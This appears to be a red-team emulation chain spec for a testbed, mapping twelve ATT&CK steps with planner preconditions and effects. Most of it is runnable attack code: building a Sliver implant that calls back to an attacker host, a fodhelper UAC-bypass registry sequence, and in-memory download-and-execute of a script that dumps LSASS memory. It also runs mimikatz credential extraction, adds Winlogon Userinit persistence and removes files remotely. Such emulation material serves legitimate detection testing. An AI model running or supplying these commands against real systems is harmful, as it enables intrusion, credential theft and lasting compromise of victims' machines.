# Chain 084

**Testbed**: `env0` · **Steps**: 12 · **Tactics touched**: Command and Control, Execution, Discovery, Privilege Escalation, Defense Evasion, Credential Access, Persistence, Impact

## MITRE ATT&CK Coverage

| Tactic | Technique IDs |
|---|---|
| Command and Control | T1071.001 |
| Execution | T1204.002, T1059.001 |
| Discovery | T1057 |
| Privilege Escalation | T1548.002 |
| Defense Evasion | T1548.002, T1070.004, T1485 |
| Credential Access | T1003.001 |
| Persistence | T1547.001 |
| Impact | T1070.004, T1485 |

## Attack Steps (Overview)

| # | Tactic | Technique | Action | Executor |
|---|---|---|---|---|
| 1 | Command and Control | T1071.001 | Build the executable file of a Sliver implant (for Windows) | Sliver Console |
| 2 | Execution | T1204.002 | Simulate the victim download and execute malicious payload file | Human |
| 3 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 4 | Discovery | T1057 | Remote Processes List | Sliver Executor |
| 5 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 6 | Privilege Escalation, Defense Evasion | T1548.002 | Bypass UAC using Fodhelper - PowerShell | Powershell Executor |
| 7 | Command and Control | T1071.001 | Execute a Sliver Implant Payload | Sliver Session Establish |
| 8 | Execution | T1059.001 | Execute PowerShell Command | Sliver Session Derive |
| 9 | Credential Access | T1003.001 | Dump LSASS.exe Memory using Out-Minidump.ps1 | Powershell Executor |
| 10 | Credential Access | T1003.001 | Offline Credential Theft With Mimikatz | Powershell Executor |
| 11 | Persistence | T1547.001 | HKLM - Append Command to Winlogon Userinit KEY Value | Powershell Executor |
| 12 | Defense Evasion, Impact | T1070.004, T1485 | Remove Remote Path | Sliver Executor |

## Attack Steps (Detail)

### Step 1 — Build the executable file of a Sliver implant (for Windows)

- **UUID**: `sliver-payload-windows-exe`
- **Source**: Manual
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.

**Execution** (Sliver Console)

```
sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
sliver > mtls --lport #{LPORT}
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the attacker machine | — | yes |
| `LPORT` | listening port of the attacter machine | — | yes |
| `SAVE_PATH` | Saved path of the generated payload | — | yes |

**Preconditions**

- `(os-windows ?target - host)`

**Effects**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?file - file)`
- `(file-on-attacker ?path - string ?file - file)`
- `(standalone-exe-file ?file - file)`
- `(payload-handler-set ?p - payload)`
- `(callback-covered ?file - file)`

---

### Step 2 — Simulate the victim download and execute malicious payload file

- **UUID**: `simulate-download-execute-file`
- **Source**: Manual
- **Supported platforms**: windows, linux
- **Tactics**: Execution
- **MITRE ID(s)**: T1204.002
- **Technique(s)**: User Execution: Malicious File

**Execution** (Human)

```
(This step needs human interaction and (temporarily) cannot be executed automatically)
(On attacker's machine)
python -m http.server #{LPORT}

(On victim's machine)
1. Open #{LHOST}:8000 in the browser
2. Navigate to the path of the target payload file
3. Download the payload file
4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `LHOST` | IP address of the http file server (typically the attacker machine) | — | yes |
| `LPORT` | port of the http file server | 8000 | yes |
| `SAVE_PATH` | Saved path of the downloaded payload | — | yes |

**Preconditions**

- `(allow-simulate-user-action ?target - host)`
- **or**(`(os-linux ?target - host)`, `(os-windows ?target - host)`, `(os-macos ?target - host)`)
- `(file-on-attacker ?localpath - string ?file - file)`
- **or**(`(standalone-exe-file ?file - file)`, `(elf-file ?file - file)`)
- `(callback-covered ?file - file)`

**Effects**

- `(file-exists ?path - string ?file - file ?target - host)`
- `(file-executed ?file - file ?target - host)`

---

### Step 3 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 4 — Remote Processes List

- **UUID**: `sliver-ps`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Discovery
- **MITRE ID(s)**: T1057
- **Technique(s)**: Process Discovery

**Description**

The `ps` command lists all running processes on a remote system. It returns a list of processes with details such as the process ID (PID) and executable name. The command includes flags for exe, overflowing terminal width, filtering based on owner/pid, printing command line arguments, skipping the first n page(s), printing process tree and setting outtime.

**Execution** (Sliver Executor)

```
ps(session_id=#{executor})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(process-info-known ?target - host)`

---

### Step 5 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 6 — Bypass UAC using Fodhelper - PowerShell

- **UUID**: `art-t1548_002-fodhelper-uac-bypass-ps`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Privilege Escalation, Defense Evasion
- **MITRE ID(s)**: T1548.002
- **Technique(s)**: Abuse Elevation Control Mechanism: Bypass User Account Control

**Description**

Uses `fodhelper.exe` — a Windows built-in auto-elevating binary in `System32` — to run a pre-staged executable at elevated integrity while bypassing the UAC prompt. Technique: seed `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with the executable path; launching `fodhelper.exe` reads that key and executes the value elevated because `fodhelper.exe` carries `autoElevate=true` in its manifest. Requires the current interactive user to be a member of the local Administrators group; running in Medium Integrity is fine — that is the point. ART auto_generated_guid 4ff64f0b-aaf2-4866-b39d-38d9791407cc.

Realistic chain: fodhelper is used to re-launch a pre-staged payload at higher integrity, giving downstream `execute-meterpreter-payload-file` (or the sliver equivalent) a `(file-executed-elevated)` on the payload file — which promotes the derived session to `(elevated-executor)` via that consumer's conditional effect. The default `C:\Windows\System32\cmd.exe` is a benign, always-present binary suitable for interactive testing of the technique itself.

Modelling note: this action is parametric in what *file* runs elevated. AALM does not yet express "run an arbitrary Windows command elevated" as a first-class predicate — that is a deliberate post-2.0 refactor. For any elevated-command chain the operator wants that isn't a pre-staged exe, wrap the command in a `.exe` (or `.bat` invoked via cmd.exe) upstream and point this action at that file.

**Execution** (Powershell Executor)

```
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "#{EXE_PATH}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence. | — | yes |
| `EXE_PATH` | Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself. | C:\\Windows\\System32\\cmd.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?file - file ?target - host)`
- `(standalone-exe-file ?file - file)`
- `(callback-covered ?file - file)`

**Effects**

- `(file-executed-elevated ?file - file ?target - host)`

---

### Step 7 — Execute a Sliver Implant Payload

- **UUID**: `execute-sliver-payload-file`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Command and Control
- **MITRE ID(s)**: T1071.001
- **Technique(s)**: Application Layer Protocol - Web Protocols

**Description**

Executing a Sliver implant payload will establish a Sliver session.

**Execution** (Sliver Session Establish)

```
None
```

**Preconditions**

- `(sliver-implant-payload ?p - payload ?target - host)`
- `(file-payload ?p - payload ?f - file)`
- `(file-executed ?f - file ?target - host)`
- `(payload-handler-set ?p - payload)`

**Effects**

- `(sliver-session ?s - executor ?target - host)`
- **when** `(file-executed-elevated ?f - file ?target - host)` → `(elevated-executor ?s - executor)`

---

### Step 8 — Execute PowerShell Command

- **UUID**: `sliver-powershell`
- **Source**: Sliver
- **Supported platforms**: windows
- **Tactics**: Execution
- **MITRE ID(s)**: T1059.001
- **Technique(s)**: Command and Scripting Interpreter: PowerShell


**Description**

The `powershell.exe` command executes a PowerShell script or command on the remote host. This command is useful for performing system monitoring tasks or gathering information about the processes running on a remote machine.

**Execution** (Sliver Session Derive)

```
# no-op — derivation only
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor_parent` | The session ID of the active Sliver connection. | — | yes |
| `executor_derived` | The derived Windows Powershell executor. | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(sliver-session ?executorID - executor ?target - host)`

**Effects**

- `(powershell ?s2 - executor ?target - host)`
- **when** `(elevated-executor ?executorID - executor)` → `(elevated-executor ?s2 - executor)`

---

### Step 9 — Dump LSASS.exe Memory using Out-Minidump.ps1

- **UUID**: `art-t1003_001-out-minidump-ps1`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Pure PowerShell dumper (Matt Graeber's Out-Minidump.ps1) that calls
the MiniDumpWriteDump Win32 API. Script is fetched from ART's
hosted source and executed in memory. Output lands at
`$env:TEMP\lsass_<PID>.dmp`. ART auto_generated_guid
6502c8f0-b775-4dbd-9193-1298f56b6781.

**Execution** (Powershell Executor)

```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1' -UseBasicParsing).Content
Get-Process lsass | Out-Minidump -DumpFilePath "#{output_dir}"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke Out-Minidump. | — | yes |
| `output_dir` | Directory on target where the LSASS dump will be written. | $env:TEMP | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`
- `(callback-covered ?f - file)`

---

### Step 10 — Offline Credential Theft With Mimikatz

- **UUID**: `art-t1003_001-mimikatz-offline-dump`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Credential Access
- **MITRE ID(s)**: T1003.001
- **Technique(s)**: OS Credential Dumping: LSASS Memory

**Description**

Mimikatz `sekurlsa::minidump <dumpfile>; sekurlsa::logonpasswords full`
processes an already-existing LSASS memory dump on target and prints
credential material to stdout. Chain-composition consumer: pair with
any dumper that emits `(lsass-dump-file …)` — ProcDump, NanoDump,
comsvcs.dll, rdrleakdiag, Out-Minidump, Silent Process Exit. Method 3
folds mimikatz staging (fetch latest release from GitHub API + unzip
via ART's Invoke-FetchFromZip helper). ART auto_generated_guid
453acf13-1dbd-47d7-b28a-172ce9228023.

**Execution** (Powershell Executor)

```
$mimikatz = "#{mimikatz_exe}"
if (-not (Test-Path $mimikatz)) {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  IEX (Invoke-WebRequest 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1' -UseBasicParsing).Content
  $releases = (Invoke-WebRequest 'https://api.github.com/repos/gentilkiwi/mimikatz/releases' -UseBasicParsing | ConvertFrom-Json)
  $zipUrl = $releases[0].assets.browser_download_url | Where-Object { $_.EndsWith('.zip') } | Select-Object -First 1
  $basePath = Split-Path (Split-Path $mimikatz)
  New-Item -ItemType Directory $basePath -Force | Out-Null
  Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
}
& $mimikatz "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" "exit"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to invoke mimikatz. | — | yes |
| `mimikatz_exe` | Target-side path where mimikatz is staged and invoked. | C:\\Users\\Public\\x64\\mimikatz.exe | yes |
| `input_file` | Path to an existing LSASS memory dump file on the target (produced by an earlier dumper action). | — | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`
- `(file-exists ?path - string ?f - file ?target - host)`
- `(lsass-dump-file ?f - file)`

**Effects**

- `(credential-data ?d - data ?target - host)`
- `(data-stored-c2 ?d - data)`

---

### Step 11 — HKLM - Append Command to Winlogon Userinit KEY Value

- **UUID**: `art-t1547_001-winlogon-userinit`
- **Source**: Atomic Red Team
- **Supported platforms**: windows
- **Tactics**: Persistence
- **MITRE ID(s)**: T1547.001
- **Technique(s)**: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

**Description**

Appends a payload command to the Winlogon `Userinit` registry value
(`HKLM\...\Winlogon`) which is executed by every user's logon.
Backs up the original value under `Userinit-backup` before modifying.
Machine-scope, requires admin. ART auto_generated_guid
f7fab6cc-8ece-4ca7-a0f1-30a22fccd374.

**Execution** (Powershell Executor)

```
$oldvalue = Get-ItemPropertyValue -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit-backup" -Value "$oldvalue"
$newvalue = $oldvalue + " #{payload}"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "$newvalue"
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The Powershell session ID used to modify Winlogon Userinit. | — | yes |
| `payload` | Command / path appended to the Winlogon Userinit value. | C:\\Users\\Public\\payload.exe | yes |

**Preconditions**

- `(os-windows ?target - host)`
- `(powershell ?executorID - executor ?target - host)`
- `(elevated-executor ?executorID - executor)`

**Effects**

- `(command-execution-at-startup ?c - string ?target - host)`

---

### Step 12 — Remove Remote Path

- **UUID**: `sliver-rm`
- **Source**: Sliver
- **Supported platforms**: windows, linux, macos
- **Tactics**: Defense Evasion, Impact
- **MITRE ID(s)**: T1070.004, T1485
- **Technique(s)**: Indicator Removal: File Deletion
, Data Destruction

**Description**

The `rm(remote_path, recursive=False, force=False)` command removes a directory or file(s) from the remote system. Parameters include remote_path (remote path), recursive (recursively remove file(s)), and force (forcefully remove the file(s)).

**Execution** (Sliver Executor)

```
rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
```

**Arguments**

| Name | Description | Default | Required |
|---|---|---|---|
| `executor` | The session ID of the active Sliver connection. | — | yes |
| `RemotePath` | Remote path | — | yes |
| `Recursive` | Recursively remove file(s) | — | yes |
| `Force` | Forcefully remove the file(s) | — | yes |

**Preconditions**

- **or**(`(os-windows ?target - host)`, `(os-linux ?target - host)`, `(os-macos ?target - host)`)
- `(sliver-session ?executorID - executor ?target - host)`
- `(file-exists ?path - string ?f - file ?target - host)`

**Effects**

- `(file-deleted ?f - file ?target - host)`

---
